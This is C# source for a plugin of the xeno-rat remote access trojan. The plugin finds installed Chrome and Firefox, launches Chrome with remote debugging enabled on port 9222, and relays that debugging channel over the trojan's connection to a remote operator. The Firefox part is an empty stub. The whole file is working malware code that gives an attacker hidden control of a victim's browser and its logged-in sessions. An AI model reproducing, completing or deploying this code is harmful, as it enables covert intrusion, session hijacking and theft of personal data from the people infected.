using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using xeno_rat_client;
using Microsoft.Win32;
using System.Net.Sockets;
using System.Diagnostics;
using System.Threading;

namespace Plugin
{
    public class Main
    {
        public string ChromeExePath() 
        {
            try
            {
                var path = Registry.GetValue("HKEY_CLASSES_ROOT\\ChromeHTML\\shell\\open\\command", null, null) as string;
                if (path != null)
                {
                    var split = path.Split('\"');
                    path = split.Length >= 2 ? split[1] : null;
                }
                return path;
            }
            catch { }
            return null;
        }
        public string FirefoxExePath() 
        {
            try
            {
                foreach (string keyname in Registry.ClassesRoot.GetSubKeyNames())
                {
                    if (keyname.Contains("FirefoxHTML"))
                    {
                        var path = Registry.GetValue(string.Format("HKEY_CLASSES_ROOT\\{0}\\shell\\open\\command", keyname), null, null) as string;
                        if (path != null)
                        {
                            var split = path.Split('\"');
                            path = split.Length >= 2 ? split[1] : null;
                        }
                        return path;
                    }
                }
            }
            catch { }
            return null;
        }

        public void recvThread(Socket sock, Node client)
        {
            while (true)
            {
                byte[] data = client.Receive();
                Console.WriteLine(Encoding.UTF8.GetString(data));
                sock.Send(data, data.Length, SocketFlags.None);
            }
        }
        public void sendThread(Socket sock, Node client)
        {
            while (true)
            {
                byte[] bits = new byte[1];
                sock.Receive(bits, bits.Length, SocketFlags.None);
                Console.WriteLine(Encoding.UTF8.GetString(bits));
                client.Send(bits);
            }
        }

        public void FirefoxForwarder(Node node,string FireFoxPath) 
        { 
            
        }
        public void ChromeForwarder(Node node, string ChromePath) 
        {
            Console.WriteLine(ChromePath);
            Console.WriteLine(ChromePath, "--user-data-dir=C:\\chrome-dev-profile23 --remote-debugging-port=9222");
            Process.Start(ChromePath,"--user-data-dir=C:\\chrome-dev-profile23 --remote-debugging-port=9222");
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            Thread.Sleep(5);
            socket.Connect("localhost", 9222);
            Console.WriteLine(socket.Connected);
            new Thread(() => sendThread(socket, node)).Start();
            recvThread(socket, node);
        }
        public void Run(Node node)
        {
            node.Send(new byte[] { 3 });//indicate that it has connected
            byte[] avalible_browsers = new byte[2];
            string chrome = ChromeExePath();
            string firefox = FirefoxExePath();
            if (chrome != null)
            {
                avalible_browsers[0] = 1;
            }
            else 
            {
                avalible_browsers[0] = 0;
            }
            if (firefox != null)
            {
                avalible_browsers[1] = 1;
            }
            else 
            {
                avalible_browsers[1] = 0;
            }
            node.Send(avalible_browsers);
            byte[] browser=node.Receive();
            if (browser[0] == 1)
            {
                ChromeForwarder(node, chrome);
            }
            else if (browser[0] == 2) 
            {
                FirefoxForwarder(node, firefox);
            }
        }
    }
}
